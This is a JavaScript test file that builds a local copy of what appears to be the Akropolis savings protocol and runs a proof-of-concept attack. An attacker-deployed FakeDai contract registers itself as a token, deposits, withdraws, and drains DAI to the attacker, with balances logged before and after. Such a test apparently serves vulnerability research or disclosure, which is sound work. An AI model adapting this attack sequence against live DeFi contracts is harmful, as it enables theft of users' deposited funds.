/** @format */
const { ether, time } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const { expect, use } = require('chai');
const web3 = require('web3');

const FakeDai = contract.fromArtifact('FakeDai');
const CurveFiProtocol_Y = contract.fromArtifact('CurveFiProtocol_Y');
const Pool = contract.fromArtifact('Pool');
const AccessModule = contract.fromArtifact('AccessModule');
const SavingsModule = contract.fromArtifact('SavingsModule');
const StakingPool = contract.fromArtifact('StakingPool');
const FreeERC20 = contract.fromArtifact('FreeERC20');
const StakingPoolADEL = contract.fromArtifact('StakingPoolADEL');
const PoolTokenCurveFiY = contract.fromArtifact('PoolToken_CurveFi_Y');
const ERC20 = contract.fromArtifact('TestERC20');
const YERC20 = contract.fromArtifact('YTokenStub');
const CurveSwap = contract.fromArtifact('CurveFiSwapStub_Y');
const CurveDeposit = contract.fromArtifact('CurveFiDepositStub_Y');
const CurveMinter = contract.fromArtifact('CurveFiMinterStub');
const CurveGauge = contract.fromArtifact('CurveFiLiquidityGaugeStub');
const RewardVestingModule = contract.fromArtifact('RewardVestingModule');
const RewardDistributionModule = contract.fromArtifact('RewardDistributionModule');
const IERC20 = contract.fromArtifact('IERC20');

const Dexag = contract.fromArtifact('DexagStub');

describe('Attack', function() {
  const [owner, user, attacker, ...otherAccounts] = accounts;

  let dai,
    usdc,
    busd,
    usdt,
    tokens,
    yDai,
    yUsdc,
    yBusd,
    yUsdt,
    curveSwap,
    curveDeposit,
    crvToken,
    curveMinter,
    weth,
    dexag,
    fakeDai,
    curveFiProtocolY,
    pool,
    accessModule,
    savingsModule,
    akro,
    stakingPoolAkro,
    adel,
    stakingPoolAdel,
    dDAI,
    rewardVesting,
    rewardDistributions,
    curveToken;

  before(async () => {
    // fakeDai = await FakeDai.new({ from: owner });
    // await fakeDai.methods['initialize(string,string,uint8)']('Fake Dai', 'FAKEDAI', 18, {
    //   from: owner,
    // });

    dai = await ERC20.new({ from: owner });
    await dai.methods['initialize(string,string,uint8)']('DAI', 'DAI', 18, { from: owner });
    await dai.methods['mint(address,uint256)'](owner, '50000000000000000000000', { from: owner });

    usdc = await ERC20.new({ from: owner });
    await usdc.methods['initialize(string,string,uint8)']('USDC', 'USDC', 6, { from: owner });
    await usdc.methods['mint(address,uint256)'](owner, '500000000000', { from: owner });

    busd = await ERC20.new({ from: owner });
    await busd.methods['initialize(string,string,uint8)']('BUSD', 'BUSD', 6, { from: owner });
    await busd.methods['mint(address,uint256)'](owner, '500000000000', { from: owner });

    usdt = await ERC20.new({ from: owner });
    await usdt.methods['initialize(string,string,uint8)']('USDT', 'USDT', 18, { from: owner });
    await usdt.methods['mint(address,uint256)'](owner, '50000000000000000000000', { from: owner });

    tokens = [dai.address, usdc.address, busd.address, usdt.address];

    yDai = await YERC20.new({ from: owner });
    await yDai.methods['initialize(address,string,uint8)'](dai.address, 'yDAI', 18, {
      from: owner,
    });

    yUsdc = await YERC20.new({ from: owner });
    await yUsdc.methods['initialize(address,string,uint8)'](usdc.address, 'yUSDC', 6, {
      from: owner,
    });

    yBusd = await YERC20.new({ from: owner });
    await yBusd.methods['initialize(address,string,uint8)'](busd.address, 'yBUSD', 6, {
      from: owner,
    });

    yUsdt = await YERC20.new({ from: owner });
    await yUsdt.methods['initialize(address,string,uint8)'](usdt.address, 'yUSDT', 18, {
      from: owner,
    });

    curveSwap = await CurveSwap.new({ from: owner });
    await curveSwap.methods['initialize(address[4])'](
      [yDai.address, yUsdc.address, yBusd.address, yUsdt.address],
      { from: owner }
    );

    curveDeposit = await CurveDeposit.new({ from: owner });
    await curveDeposit.methods['initialize(address)'](curveSwap.address, { from: owner });

    crvToken = await ERC20.new({ from: owner });
    await crvToken.methods['initialize(string,string,uint8)']('CRV', 'CRV', 18, {
      from: owner,
    });

    curveMinter = await CurveMinter.new({ from: owner });
    await curveMinter.methods['initialize(address)'](crvToken.address, { from: owner });
    await crvToken.methods['addMinter(address)'](curveMinter.address, { from: owner });

    curveToken = await IERC20.at(await curveDeposit.token({ from: owner }));

    curveGauge = await CurveGauge.new({ from: owner });
    await curveGauge.methods['initialize(address,address,address)'](
      curveToken.address,
      curveMinter.address,
      crvToken.address,
      { from: owner }
    );

    // weth = await ERC20.new({ from: owner });
    // await weth.methods['initialize(string,string,uint8)']('WETH', 'WETH', 18, {
    //   from: owner,
    // });

    // dexag = await Dexag.new({ from: owner });
    // await dexag.methods['setProtocol(address)'](weth.address, { from: owner });

    pool = await Pool.new({ from: owner });
    await pool.methods['initialize()']({ from: owner });

    accessModule = await AccessModule.new({ from: owner });
    await accessModule.methods['initialize(address)'](pool.address, { from: owner });
    await pool.methods['set(string,address,bool)']('access', accessModule.address, false, {
      from: owner,
    });

    savingsModule = await SavingsModule.new({ from: owner });
    await savingsModule.methods['initialize(address)'](pool.address, { from: owner });
    await pool.methods['set(string,address,bool)']('savings', savingsModule.address, false, {
      from: owner,
    });

    akro = await FreeERC20.new({ from: owner });
    await akro.methods['initialize(string,string)']('Akropolis', 'AKRO', { from: owner });
    await pool.methods['set(string,address,bool)']('akro', akro.address, false, { from: owner });

    stakingPoolAkro = await StakingPool.new({ from: owner });
    await stakingPoolAkro.methods['initialize(address,address,uint256)'](
      pool.address,
      akro.address,
      '0',
      { from: owner }
    );
    await pool.methods['set(string,address,bool)']('staking', stakingPoolAkro.address, false, {
      from: owner,
    });

    adel = await FreeERC20.new({ from: owner });
    await adel.methods['initialize(string,string)']('Akropolis Delphi', 'ADEL', { from: owner });
    await pool.methods['set(string,address,bool)']('adel', adel.address, false, { from: owner });

    stakingPoolAdel = await StakingPoolADEL.new({ from: owner });
    await stakingPoolAdel.methods['initialize(address,address,uint256)'](
      pool.address,
      adel.address,
      '0',
      { from: owner }
    );
    await pool.methods['set(string,address,bool)']('stakingAdel', stakingPoolAdel.address, false, {
      from: owner,
    });

    await dai.methods['approve(address,uint256)'](curveDeposit.address, '1000000000000000000000', {
      from: owner,
    });
    await usdc.methods['approve(address,uint256)'](curveDeposit.address, '1000000000', {
      from: owner,
    });
    await busd.methods['approve(address,uint256)'](curveDeposit.address, '1000000000', {
      from: owner,
    });
    await usdt.methods['approve(address,uint256)'](curveDeposit.address, '1000000000000000000000', {
      from: owner,
    });

    await curveDeposit.methods['add_liquidity(uint256[4],uint256)'](
      ['1000000000000000000000', '1000000000', '1000000000', '1000000000000000000000'],
      0,
      {
        from: owner,
      }
    );

    curveFiProtocolY = await CurveFiProtocol_Y.new({ from: owner });
    await curveFiProtocolY.methods['initialize(address)'](pool.address, { from: owner });
    await curveFiProtocolY.methods['setCurveFi(address,address)'](
      curveDeposit.address,
      curveGauge.address,
      { from: owner }
    );
    await curveFiProtocolY.methods['addDefiOperator(address)'](savingsModule.address, {
      from: owner,
    });

    dDAI = await PoolTokenCurveFiY.new({ from: owner });
    await dDAI.methods['initialize(address)'](pool.address, {
      from: owner,
    });
    await dDAI.methods['addMinter(address)'](savingsModule.address, { from: owner });

    await savingsModule.methods['registerProtocol(address,address)'](
      curveFiProtocolY.address,
      dDAI.address,
      { from: owner }
    );

    rewardVesting = await RewardVestingModule.new({ from: owner });
    await rewardVesting.methods['initialize(address)'](pool.address, { from: owner });

    await pool.methods['set(string,address,bool)']('reward', rewardVesting.address, false, {
      from: owner,
    });

    rewardDistributions = await RewardDistributionModule.new({ from: owner });
    await rewardDistributions.methods['initialize(address)'](pool.address, { from: owner });

    await pool.methods['set(string,address,bool)'](
      'rewardDistributions',
      rewardDistributions.address,
      false,
      { from: owner }
    );

    await rewardDistributions.methods['registerProtocol(address,address)'](
      curveFiProtocolY.address,
      dDAI.address,
      { from: owner }
    );
  });

  it('check', async () => {
    console.log();
    await dai.methods['transfer(address,uint256)'](user, '1000000000000000000', { from: owner });
    await dai.methods['approve(address,uint256)'](savingsModule.address, '1000000000000000000', {
      from: user,
    });

    fakeDai = await FakeDai.new({ from: attacker });
    // await fakeDai.methods['initialize(string,string,uint8)']('Fake Dai', 'FAKEDAI', 18, {
    //   from: owner,
    // });

    await fakeDai.setup(
      dai.address,
      curveFiProtocolY.address,
      savingsModule.address,
      '1000000000000000000',
      { from: attacker }
    );

    await dai.methods['mint(address,uint256)'](fakeDai.address, '1000000000000000000', {
      from: owner,
    });

    console.log(
      parseInt(await dai.methods['balanceOf(address)'](fakeDai.address)) +
        ' ' +
        'DAI balance of Attack Contract before attack'
    );

    console.log(
      parseInt(await dai.methods['balanceOf(address)'](user)) +
        ' ' +
        'DAI balance of User before deposit'
    );

    await fakeDai.methods['attack(address[],uint256[])'](
      [fakeDai.address],
      ['1000000000000000000'],
      { from: attacker }
    );

    await savingsModule.methods['deposit(address,address[],uint256[])'](
      curveFiProtocolY.address,
      [dai.address],
      ['1000000000000000000'],
      { from: user }
    );

    // console.log(
    //   'DAI balance Protocol: ' +
    //     parseInt(await dai.methods['balanceOf(address)'](curveFiProtocolY.address))
    // );

    // console.log(
    //   'yDAI - DAI balance: ' + parseInt(await dai.methods['balanceOf(address)'](yDai.address))
    // );

    // console.log(
    //   'CurveSwap - YDAI Balance: ' +
    //     parseInt(await yDai.methods['balanceOf(address)'](curveSwap.address))
    // );

    // console.log(
    //   'Gauge - CurveToken Balance: ' +
    //     parseInt(await curveToken.methods['balanceOf(address)'](curveGauge.address))
    // );

    // console.log(
    //   'User - dDAI balance: ' +
    //     parseInt(await dDAI.methods['balanceOf(address)'](user, { from: user }))
    // );

    // console.log(
    //   'Attack Contract - dDAI balance: ' +
    //     parseInt(await dDAI.methods['balanceOf(address)'](fakeDai.address, { from: attacker }))
    // );

    await dai.methods['mint(address,uint256)'](curveFiProtocolY.address, '20000000000000000000', {
      from: owner,
    });

    await savingsModule.methods[
      'withdraw(address,address,uint256,uint256)'
    ](curveFiProtocolY.address, dai.address, '1000000000000000000', '0', { from: user });

    await fakeDai.methods['withdrawAttack(uint256)']('2000000000000000000', { from: attacker });

    console.log(
      parseInt(await dai.methods['balanceOf(address)'](user)) +
        ' ' +
        'DAI balance of User after withdraw'
    );

    console.log(
      parseInt(await dai.methods['balanceOf(address)'](fakeDai.address)) +
        ' ' +
        'DAI balance of Attack Contract after Attack'
    );

    await fakeDai.methods['withdrawDAIToAttacker(address,uint256)'](
      attacker,
      '2000000000000000000',
      { from: attacker }
    );

    console.log(
      parseInt(await dai.methods['balanceOf(address)'](attacker)) +
        ' ' +
        'DAI balance of Attacker after withdraw'
    );
  });
});
